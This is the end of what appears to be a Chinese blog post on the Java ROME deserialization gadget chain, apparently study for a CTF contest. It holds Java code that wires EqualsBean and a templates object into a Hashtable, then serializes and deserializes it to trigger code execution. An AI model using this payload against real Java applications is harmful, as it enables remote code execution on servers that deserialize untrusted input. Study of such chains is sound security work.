//        HashSet hashSet = new HashSet();
        Hashtable hashtable = new Hashtable();
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", fakeTemplates);
        hashMap1.put("yy", equalsBean);
        hashMap2.put("zZ", equalsBean);
        hashMap2.put("yy", fakeTemplates);
        hashtable.put(hashMap2,1);
        hashtable.put(hashMap1,2);
        Field _beanClassField = EqualsBean.class.getDeclaredField("_beanClass");
        _beanClassField.setAccessible(true);
        _beanClassField.set(equalsBean, Templates.class);
        Field _objField = EqualsBean.class.getDeclaredField("_obj");
        _objField.setAccessible(true);
        _objField.set(equalsBean, templatesClass);
        serialize(hashtable);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```





## 总结

ROME链其实跟个小训练一样，根据调用链能自己很轻松地写出payload。下个月打华为杯别拖人后腿啊！fighting！

